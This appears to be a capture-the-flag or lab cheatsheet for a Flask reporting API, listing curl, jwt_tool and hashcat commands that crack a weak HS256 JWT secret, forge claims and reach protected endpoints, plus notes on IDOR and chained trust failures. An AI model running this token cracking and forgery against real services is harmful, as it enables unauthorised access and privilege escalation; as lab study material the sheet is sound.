# Cheatsheet — The Reporting API

## Targets

- **api01** — flask reporting api on :80

## Useful commands

```bash
curl -s http://<ip>/ | jq                              # endpoint map
curl -s -X POST http://<ip>/api/login \
  -H 'content-type: application/json' \
  -d '{"username":"<u>","password":"<p>"}' | jq -r .token

# inspect + crack
jwt_tool <token>
jwt_tool <token> -C -d <wordlist>                      # crack HS256
hashcat -m 16500 -a 0 <token> <wordlist>

# forge a claim + hit the chain
jwt_tool <token> -I -pc <claim> -pv <value> -S hs256 -k <secret>
curl -s http://<ip>/api/<path> -H "Authorization: Bearer $T" | jq
```

## Concepts

- HS256 = symmetric — whoever knows the secret mints anything
- IDOR: authorization checked on the *session*, not the *object*
- Chained trust failures compound: weak secret → forged claim → root exec
